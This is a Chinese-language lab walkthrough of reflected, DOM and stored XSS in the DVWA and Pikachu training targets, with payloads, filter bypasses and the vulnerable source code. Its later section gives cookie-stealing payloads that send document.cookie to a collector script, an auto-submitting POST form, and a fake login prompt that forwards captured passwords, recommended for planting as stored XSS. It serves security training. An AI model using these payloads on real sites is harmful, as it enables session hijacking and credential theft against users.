
## DVWA
>靶场版本：v1.10 \*Development\*

### XSS (Reflected)

#### Low

>分析

一个将输入文本输出到前端界面中的小功能，点击 Submit 按钮会发起一个 Get 请求，输入内容作为请求参数 name 的值传输给 PHP 后端处理

![](../../Image/Pasted%20image%2020230424181348.png)

>利用

Low 等级 DVWA 未对输入参数做出处理

payload:  `<script>alert(document.cookie)</script>`

*** 
#### Mid

>分析

将 low 等级的 payload 输入，发现 `<script>` 标签被过滤，应该是后端使用了黑名单策略，将敏感词汇替换了。

只对某一个标签进行过滤的操作是很容易被绕过的，常用的绕过思路如下：
1. 使用大小写绕过，输入  `<sCript>alert(document.cookie)</script>`
2. 使用双写绕过，输入 `<scr<script>ipt>alert(document.cookie)</script>`
3. 输入其他标签，如 `<IMG src=1 onerror=alert(document.cookie)>`

>利用

payload：`<Script>alert(document.cookie)</script>`

>源代码

```php
<?php      
header ("X-XSS-Protection: 0");      
// Is there any input?   
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {    
	// Get input    
	$name = str_replace( '<script>', '', $_GET[ 'name' ] );    
	// Feedback for end user    
	echo "<pre>Hello ${name}</pre>";   
}      
?>
```

`str_replace()` 的作用是将源字符串中的目标字符串替换成其他字符串，在这里的作用是将 `<script>` 替换为空，但是这个函数区分大小写，因此很好绕过。

***
#### High

>分析

使用 Mid 等级的 payload 输入提交，发现输出为 >，猜测是后端堵上了忽略大小写的漏洞，尝试使用双写绕过，也失败了，最后使用 `<img>` 标签，绕过成功。

>利用

payload: `<IMG src=1 onerror=alert(document.cookie) style="display:none">`

>源代码

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

`preg_replace()`的作用是执行一个正则表达式的搜索和替换  
其中`/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i`是正则表达式`(.*)`表示贪婪匹配，`/i`表示不区分大小写。
所以在High级别的代码中，所有关于`<script>`标签均被过滤删除了

*** 
#### Impossible

> 源代码

```php
<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

可以看到 Impossible 难度的代码使用`htmlspecialchars()`把预定义的字符&、"、'、<、>转换为 HTML 实体，防止浏览器将其作为HTML元素。还加入了`Anti-CSRF token`，防止结合`csrf`攻击。

虽然利用了`htmlspecialchars()`将用户的输入进行过滤，但是在特定情况下需要用户输入一些被过滤，会丢失原始数据。且`htmlspecialchars`本质也是`黑名单过滤`，没有绝对安全。

***
### XSS (DOM)

#### Low

>分析

一个单选框，点击 select 按钮会发起一个Get 请求，参数为选中的内容

![](../../Image/Pasted%20image%2020230424182342.png)


利用的思路在浏览器 url 栏中将 payload 插入该 Get 请求参数后

>利用

payload：`http://192.168.127.200/DVWA/vulnerabilities/xss_d/?default=english<script>alert(document.cookie)</script>`

***
#### Mid

>分析

将 low 等级的 payload 输入，发现网站把我们重定向到了原网页，并且将我们的参数修改为 English，查看源代码，发现是后端做了一个查找`<script>` 标签的判断，如果输入中存在 这个标签，那么直接重定向到原网页。

![](../../Image/Pasted%20image%2020230424193809.png)

在浏览器 url 栏中将参数值修改为 1，寻找参数在网页上渲染的位置

![](../../Image/Pasted%20image%2020230424183649.png)

因为该程序在检测到 `<script>` 标签后会进行重定向且将参数修改为默认值，因此修改大小写和双写绕过的思路是行不通的，这里我们可以使用其他标签进行注入，但是要记得在插入其他标签前，**要将 `<option>` 和 `<select>` 标签人为闭合**，因为这两个标签不支持嵌套其他标签。


这里提供一些常见的使用其他标签进行注入的思路：

1. `<img src='1' onerror='alert(1)' style="display:none">`
2. `<iframe src="javascript:alert(1)">`

>利用

payload: `http://192.168.127.200/DVWA/vulnerabilities/xss_d/?default=English</option></select><img src=1 onerror="alert(1)" style="display:none"/>`

>源代码

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?>
```

`stripos()` 的作用是寻找目标字符串在参数字符串中第一次出现的位置，如果没有出现则返回 false
`header()` 在这里的作用是将网页进行重定向

***
#### High

>分析

将 Mid 等级的 payload 输入并提交，无效。尝试各种绕过姿势，都没作用。查看网页源代码，发现前端 JS 使用了 url 中的传参，并且直接解码使用，没有做任何处理。

![](../../Image/Pasted%20image%2020230425044204.png)

但是在这之前，我们的请求是要发送给后端的，如果后端直接将请求给拒绝了，或者是向 mid 难度那样直接重定向再修改参数，那前端也是接收不到我们的 payload 的。

在这里要科普一个小技巧，Get 请求中的 # 号表示位置标识符，某些页面内跳转的功能就是这么实现的，比如：
https://github.com/donkeyQian/FIG/blob/dev/WEB/XSS/XSS_Handwork.md#high-1

而url # 后面的内容是不会传递给后端的，浏览器可以直接拿到这个数据。

>利用

payload: `http://192.168.127.200/DVWA/vulnerabilities/xss_d/?default=English#%3Cscript%3Ealert(document.cookie)%3C/script%3E`

>源代码

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?>
```

源代码对这个参数实施了白名单验证，验证不通过的还是重定向加修改参数为默认值。我们前面用黑名单的思路去绕过，难怪没用。

***
#### Impossible

>源代码

```php
<?php

# Don't need to do anything, protction handled on the client side
#不需要做任何事，在客户端处理

?> 
```

```javascript
if (document.location.href.indexOf("default=") >= 0) {
var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
document.write("<option value='" + lang + "'>" + (lang) + "</option>");
document.write("<option value='' disabled='disabled'>----</option>");
}
document.write("<option value='English'>English</option>");
document.write("<option value='French'>French</option>");
document.write("<option value='Spanish'>Spanish</option>");
document.write("<option value='German'>German</option>");
```

可以看到前端代码中使用了`(lang)`代替了`decodeURI(lang)`，不再对数据进行解码处理，因此，我们输入的任何内容都会保留 url 编码再赋值给给 lang，浏览器无法将这堆经过 url 编码的字符解析成 html 标签，我们的注入也就无法成功了。

***
### XSS (Stored)

#### Low

>分析

一个文本输入框，可以将用户的输入渲染到页面上

![](../../Image/Pasted%20image%2020230424190637.png)

利用方式和前面两种类似，将 payload 输入即可

>利用

payload: `<script>alert(document.cookie)</script>`

***
#### Mid

>分析

将 low 等级的 payload 输入，发现输出内容少了 script 标签，猜测应该也是使用了黑名单检测，尝试使用大写和双写绕过，无效，后续尝试在 Message 这一栏中输入了其他 HTML 标签绕过方式，都无效。

将 payload 注入的目标改为 Name 这一栏，发现前端对这个输入框做了长度限制，要解决这个问题一般有两种思路：
1. 在前端禁用限制
	1. 如果是在 HTML 代码中加的限制，直接在浏览器修改即可
	2. 如果是用 JS 代码做的限制，那么可以在浏览器禁用 JS
2. 抓包，在 HTTP 请求中修改参数

这两种方式能绕过前端对参数的限制，但是如果程序员在后端也加了校验就没办法了。

>利用

使用 *BurpSuite* 抓包，修改参数 Name 的值为 `<Script>alert(1)</script>`

![](../../Image/Pasted%20image%2020230425000602.png)

成功，利用这种方式也可以注入使用其他标签的 payload

![](../../Image/Pasted%20image%2020230425001108.png)

>源代码

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

`strip_tags()`函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用`<b>`标签。  
`addslashes()`函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。  
`htmlspecialchars()`函数把预定义的字符&、"、'、<、>转换为 HTML 实体，防止浏览器将其作为HTML元素 。
一顿操作对message输入内容进行检测过滤，因此无法再通过message参数注入XSS代码。

***
#### High

>分析

经过 Mid 等级的测试，发现无法通过 message 参数输入 payload，因此，还是尝试通过 Name 参数注入 payload。这次，我们不使用抓包，尝试通过修改 HTML 破解对 Name 参数长度的限制。使用浏览器的审查元素功能，将 Name 输入框的 maxlength 属性值修改为较大的数字或者直接删除这个属性。

![](../../Image/Pasted%20image%2020230425041127.png)

将 Mid 等级使用的 payload 输入并提交，发现浏览器只输出了一个 > ，从这个行为可以猜测出这里应该是使用了 黑名单 + 替换的逻辑，因为如果是采用白名单验证的话，大可以直接抛出异常或者拒绝服务，是不会有多余的输出的。再者，这个页面的业务逻辑是输入字符，在这种业务场景下使用白名单验证是会对用户体验造成影响的。

尝试使用大写绕过和双写绕过，无效。尝试其他标签绕过，成功！

> 利用

payload：`<img src="1" onerror="alert(document.cookie)" style="display:none">`

>源代码

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

message 参数的处理方式跟 Mid 难度没有区别，High 难度对 name 参数做了和 High 难度的反射型XSS 一样的处理。

***
#### Impossible

>源代码

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = stripslashes( $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $name = htmlspecialchars( $name );

    // Update database
    $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );
    $data->bindParam( ':message', $message, PDO::PARAM_STR );
    $data->bindParam( ':name', $name, PDO::PARAM_STR );
    $data->execute();
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

在Impossible代码中同样对 name 参数使用`htmlspecialchars()`函数,还加入了`Anti-CSRF token`，防止结合csrf攻击。

但是如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。

*** 
## Pikachu

### 反射型xss（get）

> 分析

一个文本输入框，点击之后会发送一个 Get 请求，将你的输入嵌入到文本再输出到前端页面上

![](../../Image/Pasted%20image%2020230425165254.png)

前端 HTML 对这个输入框做了最大长度的限制，值为 20，但是这是一个Get 请求，我们不需要抓包或者修改 HTML，直接在浏览器的 url 栏修改参数即可。

测试了一下，后端也没有对参数做限制。

>利用

payload: `http://192.168.127.200:9000/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert(document.cookie)%3C/script%3E&submit=submit`

***
### 反射型xss（post）

>分析

一个比较经典的登录表单提交功能，点击login 提交表单数据

![](../../Image/Pasted%20image%2020230425165650.png)

尝试了半天，发现这个登录的功能好像好像也没有把我输入的东西渲染到页面上啊？点了一下提示，系统让我登录，用了 XSS 后台提供的账号密码登录，显示登陆成功，然后出现了一个和 Get 请求同父异母的界面。

![](../../Image/Pasted%20image%2020230425171854.png)

这里利用的思路跟前面的是一样的

>利用

payload: `<script>alert(document.cookie)</script>`

***
### 存储型xss

>分析

一个留言板功能，点击 submit 按钮发送一个 post 请求，将你填写的参数传递给后端。这类业务的流程一般是：后端再将数据存进数据库，再返回数据库中的所有留言。

输入前文使用的 payload

![](../../Image/Pasted%20image%2020230425172146.png)

>利用

payload: `<script>alert(document.cookie)</script>`

***
### Dom型xss

>分析

还是一个输入框和一个按钮，随便输入点东西，点击按钮之后，出现了一个 a 标签。

![](../../Image/Pasted%20image%2020230425172957.png)

打开浏览器的审查元素功能，查看这个按钮做了什么，发现他执行了一个 js 函数，函数的源代码如下：

```js
function domxss(){
	var str = document.getElementById("text").value;
	document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
	}
	//试试：'><img src="#" onmouseover="alert('xss')">
	//试试：' onclick="alert('xss')">,闭合掉就行            
```

作者还在这里贴心的加了几行注释，可以看到这个函数式没有对数据进行过滤或者编码操作的，直接将我们的输入内容作为 a 标签的 href 属性。所以我们直接将 payload 输入提交即可。

>利用

这种注入点为 HTML 标签属性值的漏洞，我的思路如下：
1. 本题直接输出到 href 属性，因此可以直接用 javascript 的伪链接
2. 如果输出点是 type 这种无法直接利用的属性，我们可以使用引号将它人为闭合，添加上其他更好利用的属性，如 href，onerror，src，onmouseover ...

payload: 
* `javascript:alert(document.cookie)`
* `' onclick='alert(document.cookie)`
* `' onmouseover='alert(document.cookie)`

***
### DOM型xss-x

>分析

这个关卡基本上就是上面那道题套了一层娃，本来参数是直接从文本框拿的，但是这次点击按钮之后会发送一个 Get 请求，然后生成一个 a 标签，你要再点击一次 a 标签，才能触发 js 函数，生成带 payload 的 a 标签。

js源码：
```js
function domxss(){
	var str = window.location.search;
	var txss = decodeURIComponent(str.split("text=")[1]);
	var xss = txss.replace(/\+/g,' ');
	// alert(xss);
	
	document.getElementById("dom").innerHTML = "<a href='"+xss+"'>就让往事都随风,都随风吧</a>";
}
	//试试：'><img src="#" onmouseover="alert('xss')">
	//试试：' onclick="alert('xss')">,闭合掉就行            
```

>利用

payload: 
* `javascript:alert(document.cookie)`
* `' onclick='alert(document.cookie)`
* `' onmouseover='alert(document.cookie)`

***
### xss盲打

>分析

一个内容提交页面，点击提交按钮会发起一个 Post 请求，尝试提交一个稀奇古怪的内容，然后在 HTML文档中搜索，找不到。这道题也没有调用前端JS 函数的内容，推测应该是一个存储型 XSS 攻击。

输入 payload，提交。看了一下这道题的提示，他让我登陆一下网站的后台，看来应该是后台输出了我们提交的内容到页面上。

![](../../Image/Pasted%20image%2020230425181500.png)

>利用

打开链接：http://192.168.127.200:9000/vul/xss//xssblind/admin.php
输入： admin/123456

payload: `<script>alert(document.cookie)</script>`

果不其然，输出了我们输入的 payload

![](../../Image/Pasted%20image%2020230425182010.png)

***
### xss之过滤

>分析

一个文本输入框，点击 submit 将内容通过一个 Get 请求传递给后端。

![](../../Image/Pasted%20image%2020230425182551.png)

将无敌的 `<script>alert(1)</script>` 输入，输出一个 >，猜测应该是黑名单+替换策略，尝试使用大小写和双写绕过，无效。尝试使用其他 HTML 标签输入 payload，成功。

>利用

payload: `<img src="1" onerror="alert(document.cookie)" style="display:none">`

![](../../Image/Pasted%20image%2020230425183002.png)

*** 
### xss之htmlspecialchars

>分析

还是一个表单，点击 submit 发送 Get 请求，这道题考的应该是绕过编码的能力。

![](../../Image/Pasted%20image%2020230425183356.png)

输入 `<script>alert(1)</script>`，提交，后端返回一个新的页面，下方多了一个 a 标签，其中标签的值为我们输入的参数，href 属性值为经过 HTML 编码之后的内容。

搜索 `htmlspecialchars()` ，发现这个函数的作用是返回某些特殊字符经过 HTML 编码后的内容，而且单引号和双引号在某些配置的情况下不会被编码。

![](../../Image/Pasted%20image%2020230425235336.png)

在输入框中分别输入 " 和 '，发现输入单引号时，href 属性被闭合，后端没有采用转义 ' 的策略，可以利用这一点注入恶意代码。

而且这道题由于注入的位置是 a 标签的 href 属性，我们可以直接使用 `javascript:alert(1)` 这样的伪链接，这些字符不包含特殊字符，不会被编码成 HTML 实体。

>利用

payload: 
* `javascript:alert(document.cookie)`
* `' onmouseover='alert(document.cookie)'`

***
### xss之href输出

>分析

一个文本输入框，点击 submit 发起一个 Get 请求，将你填写的参数值发送给后端，后端返回一个新的页面，新增一个 a标签，你填写的参数作为 a 标签的 href 属性

![](../../Image/Pasted%20image%2020230426005030.png)

利用的思路还是使用伪链接。

>利用

payload: `javascript:alert(document.cookie)`

***
### xss之js输出

> 分析

一个文本输入框，点击 submit 发送一个 Get 请求。发现页面除了多出一行字外没什么反应。

![](../../Image/Pasted%20image%2020230426010351.png)

在浏览器审查元素中查找刚才输入的内容。

![](../../Image/Pasted%20image%2020230426010411.png)

发现刚才输入的内容被用在了一段 js 代码中，利用的思路是闭合赋值语句，将我们想添加的代码加在后面，当然也可以直接闭合 `<script>`，如果你的 payload 需要这样做才能生效的话。

>利用

payload: `tmac'; document.location='http://www.baidu.com`

### XSS 实战

pikachu 靶场的作者为我们提供了一套 XSS 利用代码，利用代码存放在 `/app/pkxss/` 路径（我用的是 Docker，其他方式部署的靶场路径应该也大同小异）下，要想启用这些功能，首先要打开靶场的 `管理工具\XSS后台` ，初始化数据库。

```shell
root@3843698b8a83:/app/pkxss/xcookie# ll
total 20
drwxr-xr-x 2 www-data staff 4096 Apr 25 15:33 ./
drwxr-xr-x 6 www-data staff 4096 Apr 25 14:56 ../
-rw-r--r-- 1 www-data staff  622 Jan  5  2020 cookie.php
-rw-r--r-- 1 www-data staff 1557 Jan  5  2020 pkxss_cookie_result.php
-rw-r--r-- 1 www-data staff  802 Apr 25 15:33 post.html
```

***
#### Get 获取 Cookie

>分析

从 `cookie.php` 开始看起，这段代码的意思就是将 Get 请求参数中的 cookie 参数值加上其他的一些状态保存到数据库里，然后重定向到某个网站。

```php
<?php
include_once '../inc/config.inc.php';
include_once '../inc/mysql.inc.php';
$link=connect();

//这个是获取cookie的api页面

if(isset($_GET['cookie'])){
    $time=date('Y-m-d g:i:s');
    $ipaddress=getenv ('REMOTE_ADDR');
    $cookie=$_GET['cookie'];
    $referer=$_SERVER['HTTP_REFERER'];
    $useragent=$_SERVER['HTTP_USER_AGENT'];
    $query="insert cookies(time,ipaddress,cookie,referer,useragent)
    values('$time','$ipaddress','$cookie','$referer','$useragent')";
    $result=mysqli_query($link, $query);
}
header("Location:http://192.168.1.4/pikachu/index.php");//重定向到一个可信的网站
?>
```

持久化的步骤没什么需要改的，我们将重定向的地址修改一下即可，这里我将地址修改为靶场的首页。eg：`http://192.168.127.200:9000/index.php`，也可以直接将其重定向到 referer 页面，这样客户端不会出现无缘无故跳转的情况。

利用方式：docuemnt.location 能够将浏览器重定向到其他页面，我们只要将 document.location 指向 cookie.php，就能获取用户的 cookie 了。

>利用

payload:`<script>document.location="http://192.168.127.200:9000/pkxss/xcookie/cookie.php?cookie="+document.cookie</script>`

将 payload 注入到靶场注入点中，以反射型xss(get) 为例，将 payload 输入并提交，页面跳转，后台成功获取用户的 cookie

![](../../Image/Pasted%20image%2020230426024340.png)

在正式场景中，黑客往往会将漏洞利用的 url 提取出来，诱导用户点击，以达到攻击的目的，上述漏洞的 url 为 `http://192.168.127.200:9000/vul/xss/xss_reflected_get.php?message=<script>document.location="http://192.168.127.200:9000/pkxss/xcookie/cookie.php?cookie="+document.cookie</script>&submit=submit`

一般情况下，黑客使用的都是经过缩短的短链接，因为过长的 url 可能会引起用户的戒心。

***
#### Post 获取 Cookie

> 分析

post.html 里面存放了使用 post 方法获取用户 cookie 的代码，第一个地址要修改为漏洞服务器上的地址，url 指向注入点，第二个地址是用来传递 cookie 的，因此要修改为我们用来接收 cookie 的服务器的地址。

```html
<html>
<head>
<script>
	// 页面一打开就提交表单，跳转页面
	window.onload = function() {
	  document.getElementById("postsubmit").click();
	}
</script>
</head>
<body>
	<form method="post" action="http://192.168.127.200:9000/vul/xss/xsspost/xss_reflected_post.php">
    
    <input id="xssr_in" type="text" name="message" value="<script>document.location = 'http://192.168.127.200:9000/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>"/>
    <input id="postsubmit" type="submit" name="submit" value="submit" />
</form>
</body>
</html>
```

这个漏洞利用代码是为 反射性xss(post) 量身定做的，让我们看一下打开 post.html 之后，他会做什么

![](../../Image/Pasted%20image%2020230426030223.png)

1. 页面一打开就会以 post 方法提交表单
2. 如果用户没有登录，那么这个请求会因为权限问题被拒绝访问，跳转回登录页面
	1. 所以这份代码对于未登录的用户是无效的
3. post 请求的参数 message 的值是一段 js 代码，这段代码的作用是将页面重定向到上文的 cookie.php，并将 cookie 传递过去

> 利用

1. 以 admin/123456 身份登录
2. 打开 http://192.168.127.200:9000/pkxss/xcookie/post.html
3. 打开黑客服务器后端，成功获取到了admin 的cookie

![](../../Image/Pasted%20image%2020230426031728.png)

***
#### 钓鱼攻击

>分析

钓鱼攻击的利用代码存放路径为 `/app/pkxss/xfish/fish.php`，需要将跳转的地址修改为黑客服务器的地址

```php
<?php
	error_reporting(0);
	// var_dump($_SERVER);
	if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {
	//发送认证框，并给出迷惑性的info
	    header('Content-type:text/html;charset=utf-8');
	    header("WWW-Authenticate: Basic realm='认证'");
	    header('HTTP/1.0 401 Unauthorized');
	    echo 'Authorization Required.';
	    exit;
	} else if ((isset($_SERVER['PHP_AUTH_USER'])) &&(isset($_SERVER['PHP_AUTH_PW']))){
		//将结果发送给搜集信息的后台,请将这里的IP地址修改为管理后台的IP
	    header("Location: http://192.168.1.15/pkxss/xfish/xfish.php?username={$_SERVER[PHP_AUTH_USER]}
	    &password={$_SERVER[PHP_AUTH_PW]}");
	}
?>
```

用户只要加载了这个脚本，就会进行一次验证，如果 `$_SERVER` 这个对象的 `PHP_AUTH_USER` 和 `PHP_AUTH_PW` 这两个属性有一个为空，那么就会弹出一个钓鱼弹窗，提示用户输入用户名和密码，如果用户的防范意识不强，那么就很容易中招。

如果用户已经在钓鱼弹窗中输入过用户名和密码了，那么脚本就会发起一个Get 请求，将用户输入的内容转发给另一个脚本，存进数据库。

关于 `$_SERVER` ，想了解的可以 google 一下，但是不懂也不影响我们使用，反正他只是一个用来存放用户数据的载体。

钓鱼讲究的是耐心，打好窝然后人往那一坐，等鱼上钩就行了，所以像获取 cookie 那样去生成攻击链接，忽悠用户点击未免不够优雅，容易空军。你想啊，你给人发个链接，人家半信半疑的点开，结果这个页面还谈个窗，要你输入用户名和密码，这未免也太不专业了。所以，钓鱼这种攻击方式，我推荐使用持久型XSS的形式进行部署，只要把 payload 注入到页面中，只要有人点开了这个页面就会中招。一次部署，只要对方不做输出验证就会一直有效。

>利用

将 payload 注入到 存储型xss 模块中，点击提交，浏览器成功生成钓鱼弹窗，输入用户名和密码后，后台的钓鱼记录成功获取到用户输入的用户名和密码。

payload: `<script src="http://192.168.127.200:9000/pkxss/xfish/fish.php"></script>`

![](../../Image/Pasted%20image%2020230426143906.png)

## 总结

1. 侦查
	1. 使用插件查看目标网站的安全策略，比如 httpOnly 和 CSP 策略，根据目标使用的安全策略制定 XSS 利用方案
2. 